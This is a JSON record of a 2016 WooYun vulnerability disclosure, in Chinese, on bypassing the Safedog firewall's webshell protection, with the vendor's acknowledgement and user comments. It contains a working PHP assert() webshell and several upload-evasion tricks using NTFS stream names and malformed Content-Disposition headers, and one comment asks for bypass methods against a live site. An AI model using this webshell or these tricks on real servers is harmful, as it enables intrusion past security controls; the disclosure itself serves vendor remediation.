{"id": 85962, "wybug_id": "wooyun-2016-0171345", "wybug_title": "网站安全狗webshell防御功能完全绕过（多种方法/适用于多种语言环境）", "wybug_corp": "安全狗", "wybug_author": "izy", "wybug_date": "2016-01-20 17:13", "wybug_open_date": "2016-04-11 16:08", "wybug_type": "设计错误/逻辑缺陷", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-01-20：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-01-21：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-01-24：\t细节向第三方安全合作伙伴开放（绿盟科技、唐朝安全巡航、无声信息）\t\t\t\t\t\t\t\t\t2016-03-16：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-03-26：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-04-05：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-04-11：\t细节向公众公开  简要描述： : ) 详细说明：  测试环境：win2008+php5+mysql5+apache+最新下载安全狗首先第一种针对windows的绕过：\n\n首先直接上传一个webshell，没有任意修改下肯定被拦截\n\n然后修改webshell内容为1111，还是被拦截，发现这不是重点，重点是文件名为1.php这被检测到了\n\n然后我们对文件名fuzz，发现如果split “.”这个字符如果出现php也会被拦截,例如：1.xxx.php.aaax.da这次我们上传1.php5发现传上去了，当然这种方法绕过了检测，但并不是所有情况都会解析php5为php脚本\n\n下面一种情况：      因为我们上面发现如果.php后面有字符就可以bypass，例如php5 phpa php: php@这样的知道了bypass方法，我们再来大概看一下windows的特性NTFS ADS一个完整的流的格式，如下：<filename>:<stream name>:<stream type>  所以我们可以用<filename>:<stream name>:<stream type>   这样的类型来访问创建文件首先我们可以创建一个1.asp的文件夹，如果是iis有问题的版本就会对1.asp/xx解析成asp脚本1.asp::$INDEX_ALLOCATION\n\n\n\n也可以直接上传一个shell，使用$DATA流，上传1.php::$DATA，但是发现被拦截了然后去掉了两边的双引号，发现成功绕过安全狗传上去了\n\n但是直接访问3.php被拦截，如果传上去不能访问也多打意义对吧\n\n在我多次测试后发现，被拦截的都是安全狗webshell查杀功能能查杀的文件，如果我们换成webshell查不出来的呢？那不就bypass了?换个过狗的一句话传上去\n<?php    function aa($shell)    {        assert($shell);    }aa($_REQUEST['pass']);?>\n成功绕过！！\n\n如果小伙伴们最后测试用菜刀无法连接，但是可以手工访问，那就中转一下，在数据加密的情况下，是无法检测出来的！所以我们现在可以绕过所有的防御了： webshell上传 -> webshell访问 ->webshell执行下面第二种绕过，完全适用于任何系统： 通过上面的测试，猜到你们都是用了正则来检测然后测试Content-Disposition: form-data; name=\"userfile\"; filename=4.php;注意4.php;后面有个分号shell成功传上去了，asp，jsp也不例外\n\n第三种方法，程序与服务器之间的差异：Content-Disposition: form-data111111; name=\"userfile\"; filename=5.phpform-data这是可以任意插入，服务器容错下是可以上传的，但是安全狗没做这样的容错，所以在使用正则的时候一定要注意这样的情况\n\n最后不为别的，只希望你们越做越好，提升国内安全水平！   漏洞证明：  \n\n   修复方案：  xxx   版权声明：转载请注明来源 izy@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：9  确认时间：2016-01-21 11:09 厂商回复： 这句话说的很好，最后不为别的，只希望你们越做越好，提升国内安全水平！我们也是这么希望的，非常感谢白帽子！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2016-01-20 17:17 |    \t\t乌云白帽子 \t\t\t( 路人 |\t\t\t        Rank:19 漏洞数:7        | 路人甲)\t\t \n  S    \n     2016-01-20 17:22 |    \t\tMsyb \t\t\t( 实习白帽子  |\t\t\t        Rank:53 漏洞数:14        | 非常荣幸加入乌云。)\t\t \n  前排    \n     2016-01-20 18:39 |    \t\tShAdow丶 \t\t\t( 实习白帽子  |\t\t\t        Rank:93 漏洞数:15        )\t\t \n  语言还是语音呢 -。-    \n     2016-01-20 19:19 |    \t\t骸骸 \t\t\t( 实习白帽子  |\t\t\t        Rank:38 漏洞数:8        )\t\t \n  语言还是语音呢 -。-    \n     2016-01-20 19:38 |    \t\tYang \t\t\t( 普通白帽子  |\t\t\t        Rank:331 漏洞数:107        | 作为菜鸟，大米手机摔破了怎么办？)\t\t \n  评级为SSSSSSSSSSSSSSSS    \n     2016-01-20 21:26 |    \t\t玉林嘎  \t\t\t( 普通白帽子  |\t\t\t        Rank:933 漏洞数:107        )\t\t \n  ...    \n     2016-01-27 21:12 |    \t\tsangfor.org \t\t\t( 实习白帽子  |\t\t\t        Rank:52 漏洞数:25        | 天下熙熙，皆为利来；天下攘攘，皆为利往...)\t\t \n  天外有天 人外有人    \n     2016-02-09 01:14 |    \t\t抚琴听海 \t\t\t( 路人 |\t\t\t        Rank:12 漏洞数:6        | 交流qq  752247101)\t\t \n  大牛 能不能交流下这个哦    \n     2016-02-15 10:16 |    \t\t安全狗(乌云厂商)\t\t \n  @抚琴听海 你想交流啥？    \n     2016-02-16 12:59 |    \t\t你大爷在此 百无禁忌 \t\t\t( 路人 |\t\t\t        Rank:16 漏洞数:9        | 迎风尿三丈 顺风八十米)\t\t \n  @安全狗 你管人家交流啥    \n     2016-02-16 14:12 |    \t\t乌云白帽子 \t\t\t( 路人 |\t\t\t        Rank:19 漏洞数:7        | 路人甲)\t\t \n  @安全狗 现在有个站有最新版安全狗、求注入绕过方法！~    \n     2016-03-26 11:16 |    \t\t小杰哥 \t\t\t( 普通白帽子  |\t\t\t        Rank:251 漏洞数:35        | 我不是 T0n9 和 T0n9@X1a0J1e 的大号！)\t\t \n  @乌云白帽子 现在有个站有最新版安全狗、求注入绕过方法！~     \n     2016-03-28 08:43 |    \t\t安全狗(乌云厂商)\t\t \n  @乌云白帽子 不给    \n     2016-03-28 10:40 |    \t\t黑暗游侠 \t\t\t( 普通白帽子  |\t\t\t        Rank:1784 漏洞数:269        | 123)\t\t \n  我他妈醉了。。。 测试代码我以为还有别的  坑。    \n     2016-03-28 11:00 |    \t\t安全狗(乌云厂商)\t\t \n  @黑暗游侠 没时间解释了，赶紧来提交一个漏洞压压惊吧！    \n     2016-03-29 21:27 |    \t\tucifer \t\t\t( 普通白帽子  |\t\t\t        Rank:228 漏洞数:72        | 萌萌哒~)\t\t \n  每次看你漏洞都能学到一些东西    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 9, "Ranks": null}